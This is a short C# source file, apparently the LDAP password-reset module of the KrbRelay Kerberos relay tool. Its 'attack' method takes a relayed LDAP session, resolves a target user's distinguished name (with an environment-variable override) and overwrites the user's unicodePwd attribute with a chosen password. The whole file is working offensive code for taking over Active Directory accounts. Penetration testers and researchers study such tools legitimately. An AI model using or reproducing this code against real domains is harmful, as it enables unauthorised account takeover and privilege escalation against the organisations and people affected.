using System;
using System.Text;
using static KrbRelay.Natives;

namespace KrbRelay.Clients.Attacks.Ldap
{
    internal class setPassword
    {
        public static LdapStatus attack(IntPtr ld, string user, string password)
        {
            //https://docs.microsoft.com/en-us/troubleshoot/windows/win32/change-windows-active-directory-user-password
            string dn = Generic.getPropertyValue(ld, user, "distinguishedName");
            if (string.IsNullOrEmpty(dn))
            {
                // DN resolution failed (e.g. relayed identity lacks read rights).
                // Optional manual override via environment variable.
                dn = Environment.GetEnvironmentVariable("KRBRELAY_TARGET_DN");
                if (string.IsNullOrEmpty(dn))
                    Console.WriteLine("[!] DN lookup returned empty; set KRBRELAY_TARGET_DN to override.");
            }
            return Generic.setAttribute(ld, "unicodePwd", Encoding.Unicode.GetBytes('"'+password+'"'), dn);
        }
    }
}